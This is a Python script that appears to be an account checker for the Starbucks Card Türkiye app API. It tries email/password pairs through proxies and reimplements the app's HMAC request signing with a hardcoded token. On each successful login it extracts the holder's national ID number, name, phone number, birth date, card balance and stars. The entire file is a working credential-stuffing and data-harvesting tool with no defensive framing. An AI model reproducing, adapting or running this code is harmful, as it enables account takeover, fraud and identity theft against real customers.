import traceback
import requests
import time
import json
import hmac
import hashlib

def tryLogin(data, proxy):
	email, password = data

	headers = {
		"Authorization": "Token 80f1cbbc8435bef12fb4e4575161b0fb",
		"Content-Type": "application/json; charset=utf-8",
		"User-Agent": "okhttp/3.9.1",
		"APP_TYPE": "android",
		"APP_VERSION": "1.3.1",
		"Accept": "application/json",
		"Accept-Language": "en"
	}
	s = requests.session()
	s.proxies = proxy
	s.timeout = 5
	tokenResp = s.post("https://app.starbuckscardturkiye.com/api/v1/request_token", headers=headers, data="{}", timeout=5)
	if tokenResp.status_code != 200:
		raise ConnectionError
	request_token = json.loads(tokenResp.text)['request_token']

	jsondata = json.dumps({"email": email, "password": password})
	hashresult = hmac.new(jsondata.encode('utf-8'), "POST".encode('utf-8'), hashlib.sha256).hexdigest()
	hashresult = hmac.new(request_token.encode('utf-8'), hashresult.encode('utf-8'), hashlib.sha256).hexdigest()
	headers["SB-Signature"] = request_token + ":" + hashresult
	result = s.post("https://app.starbuckscardturkiye.com/api/v1/login", headers=headers, data=jsondata, timeout=5)

	if result.status_code == 422:
		return (False,)
	if result.status_code != 200:
		time.sleep(1)
		raise ConnectionError

	data = json.loads(result.text)

	if "user" in data and data['user']['is_active']:
		tckn = data['user']['tckn']
		first_name = data['user']['first_name']
		last_name = data['user']['last_name']
		phone_number = data['user']['phone_number']
		birth_date = data['user']['birth_date']
		userid = data['user']['id']

		if type(data['user']['card']['masked_card_no']) == str:
			stars = data['user']['card']['star']

			try:
				tokenResp = s.post("https://app.starbuckscardturkiye.com/api/v1/request_token", headers=headers, data="{}", timeout=5)
				if tokenResp.status_code != 200:
					raise ConnectionError
				request_token = json.loads(tokenResp.text)['request_token']

				jsondata = json.dumps({"token": data['user']['token']})
				hashresult = hmac.new(jsondata.encode('utf-8'), "POST".encode('utf-8'), hashlib.sha256).hexdigest()
				hashresult = hmac.new(request_token.encode('utf-8'), hashresult.encode('utf-8'), hashlib.sha256).hexdigest()
				headers["SB-Signature"] = request_token + ":" + hashresult
				cardResp = s.post("https://app.starbuckscardturkiye.com/api/v1/users/{}/card/check_balance".format(userid), headers=headers, data=jsondata, timeout=5)
				if cardResp.status_code != 200:
					raise ConnectionError
				cardData = json.loads(cardResp.text)
				balance = cardData['balance']
				return (True, "Balance: {} TL, Stars: {}, TCKN: {}, First name: {}, Last name: {}, Phone number: {}, Birth date: {}".format(balance, stars, tckn,first_name,last_name,phone_number,birth_date))
			except:
				return (True, "NO CARD, TCKN: {}, First name: {}, Last name: {}, Phone number: {}, Birth date: {}".format(tckn,first_name,last_name,phone_number,birth_date))
		else:
			return (True, "NO CARD, TCKN: {}, First name: {}, Last name: {}, Phone number: {}, Birth date: {}".format(tckn,first_name,last_name,phone_number,birth_date))
	else:
		return (False,)
